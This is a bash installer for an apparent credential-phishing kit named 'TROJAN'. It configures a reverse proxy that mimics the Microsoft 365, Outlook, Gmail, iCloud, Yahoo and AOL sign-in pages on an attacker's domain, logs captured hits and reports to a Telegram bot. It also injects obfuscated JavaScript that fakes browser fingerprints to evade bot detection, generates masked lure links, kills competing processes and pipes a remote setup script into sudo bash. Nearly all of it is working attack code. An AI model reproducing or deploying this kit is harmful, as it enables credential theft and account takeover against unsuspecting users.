#!/bin/bash
# 🏛️ TROJAN - ABSOLUTE STEALTH (V15.4)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. PORT 80 MONITOR ---
show_header
echo -e "${CYAN}[...] Scanning Port 80 for Conflicts...${NC}"
CHECK_80=$(sudo lsof -t -i:80)
if [ ! -z "$CHECK_80" ]; then
    echo -e "${YELLOW}[!] PORT 80 OCCUPIED BY PID: $CHECK_80${NC}"
    echo -e "${PURPLE}Trojan requires Port 80 to establish the initial connection and verify SSL status.${NC}"
    read -p "Would you like to kill this process to allow Trojan to take control? (y/n): " KILL_CONFIRM
    if [[ "$KILL_CONFIRM" == "y" ]]; then
        sudo kill -9 $CHECK_80
        echo -e "${GREEN}[success] Port 80 Released.${NC}"
    else
        echo -e "${RED}[error] Manual intervention required. Exiting.${NC}"; exit 1
    fi
fi

# --- 2. NUCLEAR NODE.JS FIX ---
echo -e "${CYAN}[...] Executing Nuclear Node.js Upgrade...${NC}"
sudo apt-get purge -y nodejs npm && sudo apt-get autoremove -y &> /dev/null
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash - &> /dev/null
sudo apt-get install -y nodejs &> /dev/null
echo -e "${GREEN}[success] Node.js Engine Updated to $(node -v).${NC}"

# --- 3. SYSTEM PRE-FLIGHT ---
DEPS=(curl dig php screen jq npm openssl)
for dep in "${DEPS[@]}"; do
    command -v $dep &> /dev/null || sudo apt-get install -y $dep &> /dev/null
done
sudo npm install -g javascript-obfuscator &> /dev/null

# --- 4. MASTER LICENSE GATE ---
MASTER_KEY="TROJAN-PRO-2026"
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 5. CLOUDFLARE ORIGIN CA SETUP ---
echo -e "${YELLOW}»» CLOUDFLARE SSL CONFIGURATION${NC}"
echo -e "${PURPLE}Paste 'Origin Certificate' (PEM) from Cloudflare Dashboard (Ctrl+D when done):${NC}"
cat > /root/cert.pem
echo -e "${PURPLE}Paste 'Private Key' from Cloudflare Dashboard (Ctrl+D when done):${NC}"
cat > /root/key.pem
echo -e "${GREEN}[success] SSL Pair Stored.${NC}"

# --- 6. VERIFICATIONS ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    [[ $(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe") == *"\"ok\":true"* ]] && break || echo -e "${RED}[error] Bot Offline.${NC}"
done
read -p "Enter Telegram Chat ID: " TG_ID

while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    [[ $(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN") == *"\"status\":\"active\""* ]] && break || echo -e "${RED}[error] CF Token Rejected.${NC}"
done

VPS_IP=$(curl -s https://api.ipify.org)
while true; do
    read -p "Enter Base Domain: " USER_DOMAIN
    DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    if [[ "$DNS_RESOLVE" == "$VPS_IP" ]] || [[ "$DNS_RESOLVE" == 104.* ]] || [[ "$DNS_RESOLVE" == 172.* ]]; then
        echo -e "${GREEN}[success] DNS Verified.${NC}"
        break
    else
        echo -e "${RED}[error] DNS Mismatch ($DNS_RESOLVE). pointing to $VPS_IP required.${NC}"
    fi
done

read -p "Enter Path Slug: /" USER_SLUG

# --- 7. SCRAMBLED AKAMAI TELEMETRY ---
cat << 'EOF' > /tmp/raw_telemetry.js
(function() {
    setTimeout(function() {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        const getP = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(p) {
            if (p === 37445) return 'Intel Inc.';
            if (p === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
            return getP.apply(this, arguments);
        };
    }, 2000);
})();
EOF
javascript-obfuscator /tmp/raw_telemetry.js --output /var/www/adobe_gui/js/akamai_fingerprint.js --compact true --self-defending true --string-array true --string-array-encoding 'base64'
rm /tmp/raw_telemetry.js

# --- 8. TROJAN CONFIG DEPLOYMENT ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 80,
  "cert": "/root/cert.pem",
  "key": "/root/key.pem",
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "injectJs": "/var/www/adobe_gui/js/akamai_fingerprint.js",
  "slug": "$USER_SLUG",
  "headerRules": [ { "name": "X-Trojan-Edge", "value": "true" } ],
  "proxyRules": [
    {"hostname": "$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

# --- 9. TROJAN RUN SCRIPT (GHOST TERMINAL) ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'
CONFIG="/root/config.json"
DOMAIN=$(jq -r '.proxyDomain' $CONFIG)
SLUG=$(jq -r '.slug' $CONFIG)
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

clear
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}TROJAN GHOST TERMINAL${NC}   | ${PURPLE}SSL: ACTIVE${NC} | ${GREEN}STATUS: ONLINE${NC}       ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 php
pkill -9 proxy
cd /root/engine/dist/ && ./proxy -config /root/config.json
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run

# --- 10. SSL VERIFICATION TEST ---
echo -e "${YELLOW}[...] Performing SSL Pull Verification...${NC}"
# Run Trojan in background briefly to verify cert pull
cd /root/engine/dist/ && ./proxy -config /root/config.json &
SLEEP_PID=$!
sleep 3
openssl s_client -connect localhost:443 -servername $USER_DOMAIN < /dev/null 2>/dev/null | grep "issuer=O = CloudFlare Inc" && echo -e "${GREEN}[success] Cloudflare Certificate Successfully Pulled.${NC}" || echo -e "${RED}[!] SSL Verification Failed. Check cert.pem/key.pem.${NC}"
kill $SLEEP_PID &> /dev/null

echo -e "${GREEN}[success] Trojan Titanium Build Complete. Type 'Run'.${NC}"
